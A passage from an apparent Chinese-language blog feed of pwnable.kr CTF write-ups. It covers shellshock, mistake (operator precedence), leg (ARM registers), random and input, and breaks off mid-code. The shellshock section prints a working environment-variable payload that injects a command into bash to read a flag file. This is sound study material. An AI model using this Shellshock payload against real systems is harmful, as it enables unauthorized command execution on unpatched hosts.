id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>先测试一下漏洞是否存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x&#x3D;&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test &quot;</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-shellshock-2.png"  alt=""></p><p>而实际上，<code>x=&#39;() { :;}; echo vulnerable&#39;</code>是new出来了一个新的环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KEY&#x3D;x</span><br><span class="line">VALUE&#x3D;() &#123;:;&#125;; echo vulnerable</span><br></pre></td></tr></table></figure><p>而当我们后续执行bash的时候，最终会定位到initialize_shell_variables中，这个函数内部会遍历所有的环境变量，而我们设计的VALUE绕过了其中一个export函数的定义检查，使得最终执行的是后面的<code>echo vulnerable</code>串。所以，调用bash的时候，自定义的这个语句就会触发。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>那我们将自定义语句改成<code>bash -c &quot;cat ./flag&quot;</code>，bash -c换成<code>./shellshock</code>(它内部调用了<code>bash -c &#39;echo shock_me&#39;</code>)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x&#x3D;&#39;() &#123; :;&#125;; bash -c &quot;cat .&#x2F;flag&quot;&#39; .&#x2F;shellshock</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-shellshock-3.png"  alt=""></p><p>参考：</p><ul><li><a href="https://r00tk1ts.github.io/2018/03/10/shellshock/" target="_blank" rel="noopener">Writeup.pwnable.kr系列之shellshock</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr-mistake-运算符优先级</title>
      <link href="2021/04/24/pwnable-kr-mistake-%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/"/>
      <url>2021/04/24/pwnable-kr-mistake-%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题和优先级相关，提示是：operator priority，即运算符优先级</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">s[i] ^= XORKEY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">if</span>(fd=<span class="built_in">open</span>(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</span><br><span class="line">sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">if</span>(!(len=<span class="built_in">read</span>(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input password : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// xor your input</span></span><br><span class="line"><span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个逻辑并不难，就是读取十个字符，将你输入的字符异或并与之比较</p><p>但是我开始并没有想到有啥问题，发现password我没有权限打开后，我的第一反应是gdb动调…</p><p>但是题目提示并不需要什么操作，提示运算符优先级，那么去代码审计就好了，可以定位到这行语句 <code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>，看起来很正常，是判断是否open成功的语句，但实际上忽略了优先级的问题，最后实际情况是 <code>fd = 0</code>，而在linux中，0这个文件描述符指代的是stdin，即标准输入流，也就是说，这里比较的两个字符串，都是我输入的，那么获取flag也就轻而易举了，我们只要输入两个异或可得0x1的字符就可以了，例如 1（0x31）和 0（0x30）</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-mistake-1.png"  alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr-leg-arm基础</title>
      <link href="2021/04/24/pwnable-kr-leg-arm%E5%9F%BA%E7%A1%80/"/>
      <url>2021/04/24/pwnable-kr-leg-arm%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目说是arm相关，并给出了源代码与程序，我们来看一看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">"mov r3, pc\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"push&#123;r6&#125;\n"</span></span><br><span class="line"><span class="string">"addr6, pc, $1\n"</span></span><br><span class="line"><span class="string">"bxr6\n"</span></span><br><span class="line"><span class="string">".code   16\n"</span></span><br><span class="line"><span class="string">"movr3, pc\n"</span></span><br><span class="line"><span class="string">"addr3, $0x4\n"</span></span><br><span class="line"><span class="string">"push&#123;r3&#125;\n"</span></span><br><span class="line"><span class="string">"pop&#123;pc&#125;\n"</span></span><br><span class="line"><span class="string">".code32\n"</span></span><br><span class="line"><span class="string">"pop&#123;r6&#125;\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">"mov r3, lr\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Daddy has very strong arm! : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"><span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"flag"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> r = <span class="built_in">read</span>(fd, buf, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">write</span>(<span class="number">0</span>, buf, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I have strong leg :P\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很简单，就是三个函数的返回值相加要等于我们输入的key，使用了c语言内联arm汇编，同时题目给出了用gdb整出来的反汇编文件<a href="http://pwnable.kr/bin/leg.asm" target="_blank" rel="noopener">http://pwnable.kr/bin/leg.asm</a></p><p>基础知识可以参考<a href="http://0bs3rver.space/2021/03/30/mips-arm架构简述/#ARM架构简介" target="_blank" rel="noopener">ARM架构简介</a></p><h3 id="key1"><a href="#key1" class="headerlink" title="key1"></a>key1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>这里我们可以发现光有基础知识还不够，所以补充知识</p><blockquote><p>寄存器pc（r15）在arm状态下（指令长度为4，RISC等长指令集），总是指向当前指令（正在执行）+8处</p></blockquote><p>故分析可得，执行 0x00008cdc 后，r3内的值为 0x00008ce4</p><p>可得返回值r0的值为 0x00008ce4</p><h3 id="key2"><a href="#key2" class="headerlink" title="key2"></a>key2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>这里 +8 的地方熟悉保存一波 r6，然后 +12 指令实际上是 r6 = pc+1，需要注意的是bx跳转的时候是跳转到 +20，因为<strong>指令地址会先和0xFFFFFFFE进行按位与，因为最后一位肯定是0，因此最后一位用于做标志位，bx执行时如果地址最后一位是0，表示跳到arm状态，1则跳到thumb态</strong>，而在thumb态下，每条指令2字节长，故 +20 执行后，r3的值为 0x00008d08 ，然后 r3+=4 并传值给r0</p><p>故返回值r0 = 0x00008d0c</p><h3 id="key3"><a href="#key3" class="headerlink" title="key3"></a>key3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>这里需要关注的是lr寄存器，而lr<strong>用于保存子程序的返回地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00008d7c &lt;+64&gt;:bl0x8d20 &lt;key3&gt;</span><br><span class="line">0x00008d80 &lt;+68&gt;:movr3, r0</span><br></pre></td></tr></table></figure><p>故此时 lr 的值为 0x00008d80</p><p>可得返回值r0 = 0x00008d80</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>可得 0x00008ce4 + 0x00008d0c + 0x00008d80 = 0x1a770 = 108400</p><p>直接输入即可</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-leg-1.png"  alt=""></p><p>参考：</p><ul><li><a href="https://r00tk1ts.github.io/2018/03/07/leg/" target="_blank" rel="noopener">Writeup.pwnable.kr系列之leg</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr-写题记录-random与input</title>
      <link href="2021/04/18/pwnable-kr-%E5%86%99%E9%A2%98%E8%AE%B0%E5%BD%95-random%E4%B8%8Einput/"/>
      <url>2021/04/18/pwnable-kr-%E5%86%99%E9%A2%98%E8%AE%B0%E5%BD%95-random%E4%B8%8Einput/</url>
      
        <content type="html"><![CDATA[<p>反正是找手感，直接打开我扔了很久的pwnable.kr，之前写到random，那么这次就从这里开始</p><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>程序的逻辑很简单，让我们输入一个数值，程序用rand()生成一个随机数与我们的值异或，判断通过就cat flag，看起来很难完成，但实际上由于题目并没有设置随机数种子，所以每次的值都是一样的，我们只需要得到这个值就好了。</p><p>但是我找了很久…最后才发现原来服务器上其实是有gdb的，那么我们调试一下就好了，可以得到默认的值是<code>0x6b8b4567</code>，异或一下输入就好了</p><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">read</span>(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">listen</span>(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here's your flag</span></span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>粗看得知，题目需要过五关才能获得flag，然后需要满足各种输入</p><ol><li>需要有100个参数，同时第65、66个参数还需要满足特定的条件，因为中间有例如”\x00”、回车等字符，故我们在服务器上写个程序编译执行应该会方便一点，布局好之后用execve传参即可。</li><li>需要从stdin和stderr中获取字符串，但是这些字符串并没有办法直接从命令行输入，我们只能使用 I/O重定向来进行。这里需要fork一个子进程，然后用pipe实现。参考 <a href="https://www.cnblogs.com/kunhu/p/3608109.html" target="_blank" rel="noopener">linux编程之pipe()函数</a></li><li>env的值默认是系统环境变量，这里我们可以指定env并通过API——execve(“input”,argv,env)传递。<a href="https://www.runoob.com/cprogramming/c-function-getenv.html" target="_blank" rel="noopener">C 库函数 - getenv()</a></li><li>读文件，这里我们整一个这样的文件就行</li><li>socket编程，这里我们需要建立套接字连接到server上并发送信息。</li></ol><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 